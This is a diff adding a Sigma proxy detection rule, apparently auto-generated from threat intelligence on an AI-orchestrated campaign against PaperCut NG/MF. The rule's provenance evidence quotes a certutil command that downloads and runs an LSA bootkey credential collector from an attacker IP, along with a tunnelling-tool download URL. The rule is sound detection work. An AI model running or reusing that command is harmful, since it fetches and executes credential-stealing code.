@@ -1,0 +1,39 @@
+title: Request for a URL path named in the source intelligence
+id: bc275655-727e-4392-b5f6-bbb49a5ce29e
+status: experimental
+description: Deterministic IOC rule built from the indicators the source intelligence published, with
+  no model involvement. Matches a proxy or web request for a current URL path the source published. URL
+  paths appear only in proxy and web logs, not in endpoint file or process events.
+references:
+- https://www.greynoise.io/blog/ai-orchestrated-campaign-against-papercut-ng-mf
+author: hecate (auto-generated from source indicators - requires analyst review)
+date: '2026-10-07'
+tags: []
+logsource:
+  category: proxy
+detection:
+  selection:
+    c-uri|contains:
+    - /agent5.exe
+    - /lsa_collect.exe
+  condition: selection
+falsepositives:
+- Other sites serving a file at the same path
+level: high
+hecate_provenance:
+- value: http://45.142.193.132:8000/lsa_collect.exe
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.greynoise.io/blog/ai-orchestrated-campaign-against-papercut-ng-mf
+  evidence: certutil -urlcache -split -f "http://45.142.193[.]132:8000/lsa_collect.exe" C:\Windows\Temp\lsa_collect.exe
+    & C:\Windows\Temp\lsa_collect.exe Downloading and executing LSA bootkey collector
+- value: http://45.142.193.132:8089/agent5.exe
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.greynoise.io/blog/ai-orchestrated-campaign-against-papercut-ng-mf
+  evidence: http://45.142.193.132:8089/agent5.exe URL for Ligolo-ng used by adversary
+hunt_id: H-0645
